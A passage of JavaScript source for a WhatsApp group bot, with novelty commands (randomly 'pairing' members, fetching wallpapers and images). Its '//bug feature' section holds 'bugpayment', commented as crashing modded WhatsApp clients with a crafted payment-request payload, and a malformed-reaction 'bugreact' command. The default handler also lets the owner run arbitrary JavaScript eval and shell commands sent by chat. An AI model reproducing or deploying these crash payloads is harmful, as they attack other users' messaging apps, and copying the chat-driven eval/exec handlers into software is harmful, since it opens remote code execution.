"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./TzyMedia/theme/cheemspic.jpg`),
"sourceUrl": `https://chat.whatsapp.com/JsXKjrkkd9NIXEb5cMKHWz`}}},
{ quoted: m})        
            }
            break
 case 'jadian': {
            if (!m.isGroup) return replygcTzy(mess.group)
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
yudamods.sendMessage(m.chat,
{ text: `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
Cieeee, What's Going On❤️💖👀`,
contextInfo:{
mentionedJid:[orang, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./TzyMedia/theme/cheemspic.jpg`),
"sourceUrl": `https://chat.whatsapp.com/JsXKjrkkd9NIXEb5cMKHWz`}}},
{ quoted: m})        
            }
            break
                        case 'coffee': case 'kopi': {
                yudamods.sendMessage(m.chat, {caption: mess.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
            }
            break
            case 'wallpaper': {
                if (!text) return replygcTzy('Enter Query Title')
                replygcTzy(mess.wait)
		let { wallpaper } = require('./lib/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]                
                yudamods.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
            }
            break
            case 'wikimedia': {
                if (!text) return replygcTzy('Enter Query Title')
                replygcTzy(mess.wait)
		let { wikimedia } = require('./lib/scraper')
                let anumedia = await wikimedia(text)
                result = anumedia[Math.floor(Math.random() * anumedia.length)]
                yudamods.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`, image: { url: result.image }} , { quoted: m })
            }
            break
	//bug feature
case 'bugpayment' : { //crashes mod whatsapps
if (!TzyTheCreator) return replygcTzy(mess.owner)
if (!text) return replygcTzy(`Example : ${prefix + command} Tzy bihari😂`)
const { Tzyorwot } = require('./XBug/Tzybut2')
let teks = `${text}`
{
yudamods.relayMessage(from, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${Tzyorwot}`, currencyCodeIso4217: 'INR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `YUDAMODS`,"body": ` ${Tzyytimewisher} my friend ${pushname}`,
mimetype: 'audio/mpeg', caption: `🔥 ${teks} ${buttonkal}`,
showAdAttribution: true,
sourceUrl: xwebsite,
thumbnailUrl: thumb, 
}
}}}}}, { quoted:m})
}
}
break
case 'bugreact':{
if (!TzyTheCreator) return replygcTzy(mess.owner)
let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" })
yudamods.relayMessage(m.chat, { reactionMessage }, { messageId: '🦄' })
}
break

default:
if (budy.startsWith('<')) {
if (!TzyTheCreator) return
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}

if (budy.startsWith('vv')) {
if (!TzyTheCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}

if (budy.startsWith('uu')){
if (!TzyTheCreator) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) {
m.reply(stdout)
}
})
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
if (room) {
let other = room.other(sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
}

if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
yudamods.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}

} catch (err) {
console.log(util.format(err))
let e = String(err)
yudamods.sendMessage("6283842204546@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
}
}

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})